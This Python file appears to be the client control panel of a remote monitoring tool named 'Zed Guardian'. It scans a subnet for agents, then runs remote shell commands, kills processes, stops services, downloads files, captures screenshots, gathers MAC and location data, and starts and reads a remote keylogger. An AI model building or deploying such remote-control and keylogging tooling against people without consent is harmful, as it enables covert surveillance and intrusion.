import shutil
import socket
import threading
import time
from datetime import datetime
from queue import Queue
from typing import Any

import jwt
from layout import *


class NetworkScanner:
    """
    A class to perform network scanning with multithreading.

    Attributes:
        start_ip (str): The starting IP address for the scan.
        end_ip (str): The ending IP address for the scan.
        window (sg.Window): The window instance to update the GUI.
        num_threads (int): The number of threads to use for scanning.
        results (list): A list to store online IPs.
        running (bool): Flag to indicate if the scanning process is active.
    """

    def __init__(
        self,
        start_ip: str,
        end_ip: str,
        window,
        num_threads: int = os.cpu_count(),
    ):
        """
        Initializes the NetworkScanner with the IP range, window, and thread count.

        Args:
            start_ip (str): The starting IP address for the scan.
            end_ip (str): The ending IP address for the scan.
            window (sg.Window): The window instance to update the GUI.
            num_threads (int): The number of threads to use for scanning.
        """
        self.start_ip = start_ip
        self.end_ip = end_ip
        self.window = window
        self.num_threads = num_threads
        self.results = []
        self.running = False
        self.ip_queue = Queue()

    def _ip_range(self):
        """Generates a range of IPs between start_ip and end_ip."""
        start_octets = list(map(int, self.start_ip.split(".")))
        end_octets = list(map(int, self.end_ip.split(".")))

        for i in range(start_octets[-1], end_octets[-1] + 1):
            yield ".".join(map(str, start_octets[:3] + [i]))

    def _worker(self):
        """Worker thread function to process the IP queue."""
        while not self.ip_queue.empty() and self.running:

            ip = self.ip_queue.get()
            server = Server(ip=ip)
            try:
                with socket.create_connection(
                    (ip, config.server_default_port), timeout=1
                ):
                    self.window.write_event_value(
                        "status_bar", f"Checking server with {ip}: online"
                    )
                    server.status = "Online"
            except Exception:
                self.window.write_event_value(
                    "status_bar", f"Checking server with {ip}: offline"
                )
            finally:
                config.last_servers.append(server)
                self.ip_queue.task_done()

    def start(self):
        """Starts the network scanning process using multiple threads."""
        self.running = True

        # Populate the IP queue
        for ip in self._ip_range():
            self.ip_queue.put(ip)

        # Create and start threads
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self._worker)
            threads.append(thread)
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    def stop(self):
        """Stops the network scanning process."""
        self.running = False
        # Clear remaining items in the queue
        while not self.ip_queue.empty():
            self.ip_queue.get()
            self.ip_queue.task_done()

    def get_results(self):
        """Returns the list of online IPs."""
        return self.results


# Generate a JWT token
def generate_token():
    """
    Generates a JWT token for authentication.
    """
    payload = {
        "iat": time.time(),
        "exp": time.time() + 300,  # Token valid for 5 minutes
        "client": "Zed Guardian Client v0.1",
    }
    return jwt.encode(payload, SHARED_SECRET, algorithm="HS256")


def add_file_icons(files: list) -> list:
    """Add icons to file names based on their type."""
    return [
        f"📁 {f['name']}" if f["type"] == "directory" else f"📄 {f['name']}"
        for f in files
    ]


# Send a command to the server
def send_request(
    request,
    payload: Any = None,
    sg_window: sg.Window = None,
    timeout: int = 10,
):
    """
    Sends a request with an optional payload to the server and retrieves the response.

    Args:
        request (str): The request to send.
        payload (dict, optional): Additional data for the command.
        sg_window (sg.Window): The window instance to update the GUI.
        timeout (int): The number of seconds to wait for a response.
    Returns:
        dict: The server's response.
    """

    if not config.server_is_selected():
        return {
            "success": False,
            "message": str("Please connect to a server."),
        }
    try:
        token = generate_token()
        request = {
            "token": token,
            "request": request,
        }
        if payload:
            request.update(payload)

        with socket.create_connection(
            (config.selected_server.ip, config.selected_server.port),
            timeout=timeout,
        ) as sock:
            # Send request
            sock.sendall(json.dumps(request).encode("utf-8"))

            # Read the length prefix (10 bytes)
            length_prefix = sock.recv(10).decode("utf-8").strip()
            response_length = int(length_prefix)

            # Read the full response
            data = b""
            while len(data) < response_length:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            if sg_window is not None:
                sg_window.write_event_value(
                    "send_request",
                    {"success": True, "message": "Successfully sent request"},
                )
            return json.loads(data.decode("utf-8"))
    except Exception as e:
        if sg_window is not None:
            sg_window.write_event_value(
                "send_request", {"success": False, "message": str(e)}
            )
        return {"success": False, "message": str(e)}


def list_files(directory: str) -> list:
    """
    Request the server to list files in the specified directory,
    sorted by type (folders first) and then by name.
    Ensures icons are added only once.
    """
    response = send_request("list_files", {"directory": directory})
    if response["success"]:
        files = response["data"]
        # Sort directories first, then files
        sorted_files = sorted(
            files, key=lambda f: (f["type"] != "directory", f["name"].lower())
        )
        # Add icons directly in this function
        return [
            {
                "name": (
                    f"📁 {f['name']}" if f["type"] == "directory" else f"📄 {f['name']}"
                ),
                "type": f["type"],
            }
            for f in sorted_files
        ]
    else:
        sg.popup_error(response["message"])
        return []


def download_file(file_path) -> None:
    """Request the server to download the specified file."""
    response = send_request("download_file", {"file_path": file_path})
    if response["success"]:
        file_name = response["data"]["file_name"]
        file_data = bytes.fromhex(response["data"]["file_data"])
        with open(file_name, "wb") as f:
            f.write(file_data)
        sg.popup_ok(f"File downloaded: {file_name}")
    else:
        sg.popup_error(response["message"])


def append_to_console(window, text: str) -> None:
    """
    Appends text to the console output without overwriting the existing content.
    """
    current_output = window["console_output"].get()
    updated_output = f"{current_output}\n{text}".strip()  # Add new text
    window["console_output"].update(updated_output)
    window["console_output"].set_vscroll_position(1.0)  # Scroll to the bottom


def execute_command_in_thread(window, command: str) -> None:
    """
    Executes a command in a separate thread to keep the GUI responsive.
    """

    def worker():
        result = send_command_to_server(command)
        if result["success"]:
            # Append command output to the console
            output = result["data"].get("output", "")
            if output:
                append_to_console(window, output)
            else:
                append_to_console(window, "No output received.")
        else:
            # Append error messages to the console
            append_to_console(window, f"ERROR: {result['message']}")

    threading.Thread(target=worker, daemon=True).start()


def monitor_command_log(
    window, log_file: str = "command_output.log", interval: int = 1
) -> None:
    """
    Continuously reads the command log file and updates the GUI.
    """
    last_position = 0
    while True:
        try:
            with open(log_file, "r", encoding="utf-8") as file:
                file.seek(last_position)  # Start from the last read position
                new_content = file.read()
                if new_content:
                    window.write_event_value("update_console", new_content)
                last_position = file.tell()  # Update the last read position
        except FileNotFoundError:
            # Log file doesn't exist yet, skip
            pass
        time.sleep(interval)


def send_command_to_server(command: str) -> dict:
    """
    Sends a command to the server for execution and returns the response.
    """
    response = send_request("execute_command", {"command": command})
    return response


# Display messages
def message(result: dict) -> None:
    """
    Displays a message dialog based on the result.

    Args:
        result (dict): The result from the server.
    """
    if result:
        message_text = result["message"]
        if result.get("success", False):
            sg.popup_ok(message_text, no_titlebar=True)
        else:
            sg.popup_error(message_text, no_titlebar=True)
    else:
        sg.popup_error(f"Response is: {result}", no_titlebar=True)


# GUI for controlling the server
def client_gui():
    global SCREENSHOT_PATH, window_ids

    current_processes = []
    current_services = []
    scanner = None

    while True:
        event, values = window.read()

        if event in (sg.WINDOW_CLOSED, "Exit"):
            break

        elif event == "Refresh Processes":
            result = send_request("get_processes")
            if result["success"]:
                current_processes = [
                    [proc["pid"], proc["name"], proc["username"]]
                    for proc in result["data"]
                ]
                window["process_table"].update(current_processes)
            else:
                message(result)

        elif event == "Search Process":
            query = values["process_search"].lower()
            filtered_processes = [
                proc for proc in current_processes if query in proc[1].lower()
            ]
            window["process_table"].update(filtered_processes)

        elif event == "Kill Selected Process" and values["process_table"]:
            selected_row = values["process_table"][0]
            pid = current_processes[selected_row][0]
            result = send_request("kill_process", {"pid": pid})
            message(result)

        elif event == "Refresh Services":
            result = send_request("get_services")
            if result["success"]:
                current_services = [
                    [svc["name"], svc["status"], svc["display_name"]]
                    for svc in result["data"]
                ]
                window["service_table"].update(current_services)
            else:
                message(result)
        elif event is not sg.TIMEOUT_KEY:
            if len(event) == 1 and ord(event) == 13:
                command = values["console_input"].strip()
                if command:
                    window["console_input"].update("")
                    execute_command_in_thread(window, command)
        elif event == "Search Service":
            query = values["service_search"].lower()
            filtered_services = [
                svc for svc in current_services if query in svc[0].lower()
            ]
            window["service_table"].update(filtered_services)

        elif event == "Stop Selected Service" and values["service_table"]:
            selected_row = values["service_table"][0]
            service_name = current_services[selected_row][0]
            result = send_request("stop_service", {"service_name": service_name})
            message(result)

        if event == "Refresh Windows":
            result = send_request("list_windows")
            if result["success"]:
                window_titles = [
                    f"{w['title']} (ID: {w['id']})" for w in result["data"]
                ]
                window_ids = {w["title"]: w["id"] for w in result["data"]}
                window["window_list"].update(values=window_titles)
            else:
                message(result)

        elif event == "Take Screenshot":
            selected_window = values["window_list"]
            if selected_window:
                # Extract the window ID from the selected item
                window_title = selected_window.split(" (ID:")[0]
                window_id = window_ids.get(window_title)
                if window_id:
                    result = send_request("capture_window", {"window_id": window_id})
                    if result["success"]:
                        SCREENSHOT_PATH = result["data"]["file_path"]
                        window["screenshot_preview"].update(filename=SCREENSHOT_PATH)
                        sg.popup_ok("Screenshot taken successfully.")
                    else:
                        message(result)
            else:
                sg.popup_error("Please select a window to capture.")

        elif event == "Save Screenshot" and SCREENSHOT_PATH:
            save_path = sg.popup_get_file(
                "Save Screenshot",
                save_as=True,
                file_types=(("PNG Files", "*.png"),),
            )
            if save_path:
                try:
                    shutil.copy(SCREENSHOT_PATH, save_path)
                    sg.popup_ok("Screenshot saved successfully.")
                except Exception as e:
                    sg.popup_error(f"Error saving screenshot: {e}")

        elif event == "Start Keylogger":
            result = send_request("start_keylogger")
            window["Start Keylogger"].update(disabled=True)
            window["Stop Keylogger"].update(disabled=False)
            message(result)
        elif event == "refresh_keylogger_logs":
            result = send_request("get_keylogs")
            if result["success"]:
                logs = result["data"]
                window["key_logs"].update(logs)
            message(result)
        elif event == "Stop Keylogger":
            result = send_request("stop_keylogger")
            window["Stop Keylogger"].update(disabled=True)
            window["Start Keylogger"].update(disabled=False)
            message(result)

        if event in ("recurring_days", "specific_date"):
            is_recurring = values["recurring_days"]
            window["day_picker"].update(disabled=not is_recurring)
            window["specific_date_picker"].update(disabled=is_recurring)
            window["Select Date"].update(disabled=is_recurring)

        if event == "Add Schedule":
            start_time = values["start_time_picker"]
            end_time = values["end_time_picker"]

            if values["recurring_days"]:
                schedule_type = "Recurring"
                date_or_day = values["day_picker"]
            elif values["specific_date"]:
                schedule_type = "Specific"
                date_or_day = values["specific_date_picker"]
                if not date_or_day:
                    sg.popup_error("Please select a specific date.")
                    continue
            else:
                sg.popup_error("Please select a schedule type.")
                continue

            try:
                start_time_24hr = datetime.strptime(start_time, "%I:%M %p").strftime(
                    "%H:%M"
                )
                end_time_24hr = datetime.strptime(end_time, "%I:%M %p").strftime(
                    "%H:%M"
                )

                result = send_request(
                    "add_schedule",
                    {
                        "schedule_type": schedule_type,
                        "date_or_day": date_or_day,
                        "start_time": start_time_24hr,
                        "end_time": end_time_24hr,
                    },
                )
                if result["success"]:
                    current_schedule = result["data"]
                    window["schedule_table"].update(
                        [
                            [
                                entry.get("type", ""),
                                entry.get("date_or_day", ""),
                                entry.get("start", ""),
                                entry.get("end", ""),
                            ]
                            for entry in current_schedule
                        ]
                    )
                message(result)
            except ValueError:
                sg.popup_error("Invalid time or date selection.")

        elif event == "Remove Selected Schedule":
            selected_row = values["schedule_table"]
            if selected_row:
                index = selected_row[0]
                result = send_request("remove_schedule", {"index": index})
                if result["success"]:
                    current_schedule = result["data"]
                    window["schedule_table"].update(
                        [[entry["start"], entry["end"]] for entry in current_schedule]
                    )
                message(result)
            else:
                sg.popup_error("Please select a schedule to remove.")

        if event == "Refresh Schedules":
            result = send_request("list_schedules")
            if result["success"]:
                current_schedule = result["data"]
                window["schedule_table"].update(
                    [
                        [
                            entry.get("type", ""),
                            entry.get("date_or_day", ""),
                            entry.get("start", ""),
                            entry.get("end", ""),
                        ]
                        for entry in current_schedule
                    ]
                )
            message(result)
        elif event == "Refresh Logs":
            result = send_request("get_logs")
            if result["success"]:
                log_data = result["data"]
                selected_level = values["log_level"].lower()
                filtered_logs = "\n".join(
                    line
                    for line in log_data.split("\n")
                    if selected_level in line.lower()
                )
                window["log_viewer"].update(filtered_logs)
            else:
                message(result)

        elif event == "Clear Logs":
            result = send_request("clear_logs")
            message(result)
        elif event == "Test Internet Connectivity":
            result = send_request("check_internet")
            message(result)
        elif event == "Set Log Level":
            log_level = values["log_level"]
            result = send_request("set_log_level", {"level": log_level})
            message(result)
        elif event == "List Directory":
            directory = values["current_dir"]
            files = list_files(directory)
            if files:
                window["file_list"].update([f["name"] for f in files])
        elif event == "back_directory":
            current_directory = values["current_dir"]
            parent_directory = os.path.dirname(
                current_directory
            )  # Get the parent directory
            if parent_directory:
                files = list_files(parent_directory)
                if files:
                    # Update the file list and current directory
                    window["file_list"].update(
                        [f"{f['name']} ({f['type']})" for f in files]
                    )
                    window["current_dir"].update(parent_directory)
                else:
                    sg.popup_error("Unable to access parent directory.")
            else:
                sg.popup_error("Already at the root directory.")
        elif event == "file_list" and values["file_list"]:
            selected_item = values["file_list"][0]
            current_directory = values["current_dir"]

            # Extract the clean name by removing the icon
            selected_item_cleaned = selected_item.lstrip("📁 ").lstrip("📄 ").strip()

            # Retrieve file data from the list_files response
            files = list_files(current_directory)
            selected_file_data = next(
                (
                    f
                    for f in files
                    if f["name"].lstrip("📁 ").lstrip("📄 ").strip()
                    == selected_item_cleaned
                ),
                None,
            )

            if selected_file_data:
                if selected_file_data["type"] == "directory":
                    # Navigate into the directory
                    new_directory = os.path.join(
                        current_directory, selected_item_cleaned
                    )
                    new_files = list_files(new_directory)
                    window["file_list"].update([f["name"] for f in new_files])
                    window["current_dir"].update(new_directory)
                elif selected_file_data["type"] == "file":
                    # Select the file for download
                    window["download_status"].update(selected_item_cleaned)
                    window["Download Selected File"].update(disabled=False)
        elif event == "update_console":
            # Append new content from the log file to the console
            window["console_output"].update(values[event], append=True)
        elif event == "Download Selected File" and values["file_list"]:
            selected_file = (
                values["file_list"][0].split(" (")[0].strip("📄 ").strip("📁 ")
            )
            full_path = os.path.join(values["current_dir"], selected_file)
            download_file(full_path)
        elif event == "Scan Network":
            config.last_servers = []
            config.search_server.start_ip = values["start_ip"]
            config.search_server.end_ip = values["end_ip"]
            scanner = NetworkScanner(
                config.search_server.start_ip,
                config.search_server.end_ip,
                window,
            )
            threading.Thread(target=scanner.start, daemon=True).start()
            window["status_bar"].update("Scanning started...")
            window["Scan Network"].update(disabled=True)
            window["Stop Scanning"].update(disabled=False)
        elif event == "Stop Scanning":
            if scanner:
                scanner.stop()
                window["Stop Scanning"].update(disabled=True)
                window["Scan Network"].update(disabled=False)
            window["status_bar"].update("Scanning stopped.")
        elif event == "Reset Search History":
            save_config()
            if scanner:
                scanner.stop()
            window["server_table"].update([])
            window["Stop Scanning"].update(disabled=True)
            window["Scan Network"].update(disabled=False)
            window["status_bar"].update("Reset Search History.")
        elif event == "status_bar":
            save_config(config)
            window["server_table"].update(
                [server.to_table_row() for server in config.last_servers]
            )
            window["status_bar"].update(values[event])
        elif event == "server_table" and values[event]:

            window["status_bar"].update(
                f"Connecting to Server: {config.last_servers[values[event][0]].ip} ",
                background_color="#FFDD95",
            )
            try:
                config.selected_server = config.last_servers[values[event][0]]
            except IndexError:
                config.selected_server = None
            log_level = values["log_level"]
            threading.Thread(
                target=send_request,
                args=["check_connection", {"level": log_level}, window, 1],
                daemon=True,
            ).start()
        elif event == "send_request":
            if values["send_request"].get("success", False):
                window["status_bar"].update(
                    f"Connected to: {config.selected_server.ip}",
                    background_color="#99FF00",
                )
                response = send_request("get_system_info")
                mac_address = ""
                location = {}
                if response["success"]:
                    mac_address = response["data"]["mac_address"]
                    location = response["data"]["location"]
                config.update_server(
                    ip=config.selected_server.ip,
                    last_connected=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    mac_address=mac_address,
                    city=location.get("city", ""),
                    country=location.get("country", ""),
                    zipcode=location.get("zipcode", ""),
                    isp=location.get("isp", ""),
                )
                save_config(config)

            else:
                window["status_bar"].update(
                    f"Cannot connect to: {config.selected_server.ip} due to {values['send_request'].get('message')}",
                    background_color="#FF8282",
                )

        window["server_table"].update(
            [server.to_table_row() for server in config.last_servers]
        )

    window.close()


if __name__ == "__main__":
    threading.Thread(target=monitor_command_log, args=(window,), daemon=True).start()
    client_gui()
